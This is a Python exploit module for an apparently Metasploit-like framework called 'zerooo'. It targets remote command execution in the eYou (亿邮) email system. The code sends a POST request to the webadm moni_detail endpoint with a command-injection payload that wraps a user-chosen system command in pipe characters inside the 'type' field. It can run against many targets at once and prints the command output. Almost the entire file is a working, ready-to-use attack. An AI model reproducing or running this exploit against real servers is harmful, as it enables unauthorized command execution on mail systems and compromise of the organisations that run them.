import re

from zerooo.core.asyncpool import async_run
from zerooo.core.log import LOGGER
from zerooo.core.options import Option
from zerooo.request.httpclient import HttpClient
from zerooo.utils.util import get_target


class Zerooosploit(Option):

    def __init__(self):
        super(self.__class__, self).__init__()
        self.info = {
            'Name': '亿邮电子邮件系统远程命令执行',
            'Module': 'exploit/eyou/eyou-rce',
            'Product': '亿邮电子邮件系统',
            'Cve': '',
            'Create_date': '20210411',
            'Description': '亿邮电子邮件系统 存在远程命令执行漏洞，攻击者可以执行任意命令',
            'Authors': '',
            'References': ''
        }

        self.option = {
            'targets': {'Current Setting': '', 'Required': 'yes', 'Description': '目标url，多个目标请用,分开'},
            'command': {'Current Setting': '', 'Required': 'yes', 'Description': '系统命令'}
        }

    async def eyou_rce(self, target):
        vuln_url = target + '/webadm/?q=moni_detail.do&action=gragh'
        command = self.get_options('command')
        data = {'type': f'\'|{command}||\''}
        resp = await HttpClient().send_request_cgi('POST', url=vuln_url, data=data)
        return resp

    def eyou_rce_callback(self, future):
        resp = future.result()
        if resp:
            if resp['code'] == 200:
                result = resp['text']
                LOGGER.success(result)
            else:
                msg = 'The target ' + str(resp['url']) + ' not vuln !'
                LOGGER.info(msg)

    def exploit(self):
        targets = get_target(self.get_options('targets'))
        async_run(self.eyou_rce, targets, self.eyou_rce_callback)
        LOGGER.info('exploit complete')
